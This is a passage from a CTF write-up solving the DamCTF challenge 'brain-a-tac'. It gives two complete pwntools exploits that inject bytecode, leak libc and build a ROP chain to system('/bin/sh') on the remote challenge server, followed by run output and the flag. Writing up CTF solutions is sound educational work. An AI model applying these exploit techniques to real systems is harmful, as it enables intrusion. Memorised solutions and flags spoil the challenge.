  a0: 00010008  jnz     0x84
...

It's very possible to use this to write your ROP with this.
My other idea is that from 0xa4 onwards, we can start writing our own bytecode
so we can just prepare another read loop
'''

mem = bytearray(0x300)

# you can probably use io.clean() in pwntools
# then check how many bytes are sent back
io.recv(0xc)
io.send(b'\x00')

info("starting info leak loop...")
idx = 0xa4
while idx < 0xa8:
    recvd = io.recv(1)
    # read the byte, then send it back lol
    mem[idx] = u8(recvd)
    real_send(recvd)
    idx = (idx + 1) & 0xffff

'''
now we write instructions for memory overwrite
the memory overwrite will be performed backwards, byte by byte
we don't really need to leak bytes anymore so we just perform reads

below is the idea...

read_byte_not_zero:
    getc [mp]
    jz exit
    getc [mp]
read_loop:
    dec mp
    getc [mp]
    jz read_loop
    jnz read_byte_not_zero
...
...
exit: /* ip = 0x7f causes program to finish */
'''

instructions = [
        0x4, # getc [mp]
        0x7f0007, # jz exit
        0x4, # getc [mp]
        0x2, # dec mp
        0x4, # getc [mp]
        0x0d0007, # jz read_loop
        0x0a0008, # jnz read_byte_not_zero
]
instructions = b''.join(map(p32, instructions))

info("injecting write loop bytecode")
for c in instructions:
    recvd = io.recv(1)
    mem[idx] = c
    real_send(p8(c))
    idx = (idx + 1) & 0xffff
success("write loop injected!")

info("resuming info leak... this will take a while")
while idx != 0x2bf:
    recvd = io.recv(1)
    # read the byte, then send it back lol
    mem[idx] = u8(recvd)
    sys.stdout.buffer.write(b'.')
    sys.stdout.flush()
    if idx == 0x27e:
        # we are writing the ip explicitly,
        # so we don't need to send the same byte three times
        io.send(b'\x03')
    else:
        real_send(recvd)
    idx = (idx + 1) & 0xffff
success("info leak finished!")

# now first loop ends, we get to second loop
stop_reading()

libc_leak = mem[0x290:0x298]
libc.address = u64(libc_leak) - 0x2a3b8

info(f'{hex(libc.address)=}')


# ROP chain starts at mem[0x290]

rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))
rop.system(next(libc.search(b'/bin/sh\x00')))

print(rop.dump())

# ROP starts at 0x290
payload = rop.chain().ljust(0x2be - 0x290 + 1, b'\x00')[::-1]

info("writing ROP chain using our new write loop")
for c in payload:
    real_send(p8(c))
success("ROP chain injected!")

info("stopping program")
# we should be at the highest byte of rbp. we can clear that to zero with stop_reading
# not like we need rbp or anything
stop_reading()


success("shell spawned")
if args.REMOTE:
    info("for remote, we're only using the shell to print the flag")
    io.clean()
    io.sendline(b"cat flag")
    success("Found the flag: " + io.recvline().decode())
else:
    io.interactive()

# flag: dam{im_r3411y_g1ad_i_didnt_g0_w1th_ma1bo1g3_f0r_th1s_cha11}
```

Here's how it looks like:

```
# ./exploit.py REMOTE
[*] '/shared/brain-a-tac/bf_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
[*] '/shared/brain-a-tac/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[!] Did not find any GOT entries
[*] '/shared/brain-a-tac/ld-linux-x86-64.so.2'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to brain-a-tac.chals.damctf.xyz on port 31337: Done
[*] modifying bytecode to get an info leak loop
[+] bytecode modified! we now have info leak loop
[*] starting info leak loop...
[*] injecting write loop bytecode
[+] write loop injected!
[*] resuming info leak... this will take a while
[!] if the dots get printed in short bursts, CANCEL IT AND RE-RUN. this only happens in remote
... tons of dots here but i removed them for the writeup ...
[*] hex(libc.address)='0x7fe2e41d3000'
[*] Loaded 116 cached gadgets for './libc.so.6'
0x0000:   0x7fe2e41fba93 ret
0x0008:   0x7fe2e42ec03c pop rdi; ret
0x0010:   0x7fe2e43ac44a [arg0] rdi = 140612468393034
0x0018:   0x7fe2e422df30 system
[*] writing ROP chain using our new write loop
[+] ROP chain injected!
[*] stopping program
[+] shell spawned
[*] for remote, we're only using the shell to print the flag
[+] Found the flag: dam{im_r3411y_g1ad_i_didnt_g0_w1th_ma1bo1g3_f0r_th1s_cha11}
[*] Closed connection to brain-a-tac.chals.damctf.xyz port 31337
```

#### The exploit developer's solution (White)

Simply run it and you get a shell. You can change which line is commented to run a local process instead.

```python
from pwn import *
context.binary = exe = ELF('./bf_patched')
libc = exe.libc


#p = process([exe.path, ">,[[>],[<]>-]-[>]-[<.+]++++++++++."])
p = remote("brain-a-tac.chals.damctf.xyz", 31337)

def real_send(bv: bytes):
    p.send(bv)
    if bv != b'\x00':
        p.send(bv)
        p.send(bv)

def stop_reading(bv = b'1'):
    p.send(bv)
    p.send(b'\x00')

p.send(b'\xff\x00' * 0x2b)
p.send(b'\x01\x00\x04\x01\x00\x41\x07\x01\x01\x04\x00\x00\x01\x03\x00\x01\x00\x04\x00\x00\x00\x08\x01\x04\x00\x07\x00\x05\x04\x00\x08\x01\x00\x01\x01\x01')
sleep(1)
p.recv(0xc)
p.send(b'\x00')


mem = bytearray(0x300)

idx = 0xa4
while idx != 0:
    recvd = p.recv(1)
    print(recvd)
    mem[idx] = u8(recvd)
    if idx == 0x27e:
        # we are writing the ip
        p.send(b'\x03')
    elif idx == 0x290:
        real_send(b'\x34')
    elif idx == 0x290 + 8:
        libc.address = u64(mem[0x290:0x290+8]) - libc.symbols['__libc_start_call_main'] - 120
        print(hex(libc.address))
        rop = ROP(libc)
        rop.system(next(libc.search(b'/bin/sh\0')))

        payload = rop.chain()

        for i in payload:
            real_send(bytes([i]))
        
        stop_reading()
        p.interactive()
        exit()
    else:
        real_send(recvd)
    
    if idx == 0x2:
        real_send(bytes([mem[0x27e:0x27e+8][(idx-0x27e)%8]]))
    if idx == 0x2ff:
        stop_reading()
        break
    print(hex(idx))
    idx = (idx + 1) & 0xffff
    # pause()
print(mem)

p.interactive()
```

There's so much printing stuff so just run it for yourselves and see... smh (I think I wrote those)

## Conclusion

I hope this goes to show that I am a human fuzzer. Aside from pwn/charful, which needed some knowledge about the weird ARM machine, my VR skills and instincts were put to test this CTF.

- A sanity check/beginner-friendly challenge that is probably intended to be solved with some game reverse engineering, was solved with pure luck!
- A hard challenge that requires creativity! Creating a debugger was probably the best thing I did this CTF.

Huge props to the DamCTF organizers, Oregon State University Security Club ([OSUSEC](https://www.osusec.org/))! Looking forward to the next CTF!

gg
